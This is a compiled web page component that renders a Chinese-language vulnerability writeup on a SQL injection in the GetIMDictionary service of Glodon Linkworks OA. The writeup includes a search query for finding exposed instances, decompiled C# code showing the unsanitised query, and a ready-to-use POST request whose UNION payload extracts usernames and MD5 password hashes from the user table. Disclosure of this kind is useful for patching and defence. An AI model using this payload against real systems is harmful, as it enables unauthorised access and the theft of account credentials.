import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as t,e as n}from"./app-58e4a7d6.js";const a={},r=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>广联达 Linkworks办公OA GetIMDictionary接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>广联达 Linkworks</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>web.body=&quot;/Services/Identification/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150337640.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>// GTP.IM.Services.Config.WebSite.WebService.IM.Config.ConfigService
// Token: 0x06000018 RID: 24 RVA: 0x00004148 File Offset: 0x00002348
[WebMethod(Description = &quot;得到IM系统配置&quot;)]
public string GetIMDictionary(string key)
{
	string str = string.Empty;
	ISysConfigService service = ServiceFactory.GetService&lt;ISysConfigService&gt;();
	StringBuilder stringBuilder = new StringBuilder();
	stringBuilder.AppendFormat(&quot;select F_VALUE from T_IM_DICTIONARY where f_key=&#39;{0}&#39;;&quot;, key);
	DataSet dataSet = GSqlDataAccess.SelectDataSet(service.DataSourceName, stringBuilder.ToString(), new DataParameter[0]);
	if (dataSet != null &amp;&amp; dataSet.Tables.Count &gt; 0 &amp;&amp; dataSet.Tables[0] != null)
	{
		foreach (object obj in dataSet.Tables[0].Rows)
		{
			DataRow dataRow = (DataRow)obj;
			str = dataRow[&quot;F_VALUE&quot;].ToString();
		}
	}
	StringBuilder stringBuilder2 = new StringBuilder();
	stringBuilder2.Append(&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;utf-8\\&quot;?&gt;&quot;);
	stringBuilder2.Append(&quot;&lt;result  value=\\&quot;&quot; + str + &quot;\\&quot; &gt;&quot;);
	stringBuilder2.Append(&quot;&lt;/result&gt;&quot;);
	return stringBuilder2.ToString();
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150533931.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

key=1&#39; UNION ALL SELECT top 1 concat(F_CODE,&#39;:&#39;,F_PWD_MD5) from T_ORG_USER --
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150553176.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),d=[r];function s(l,o){return i(),t("div",null,d)}const v=e(a,[["render",s],["__file","广联达 Linkworks GetIMDictionary SQL注入漏洞.html.vue"]]);export{v as default};
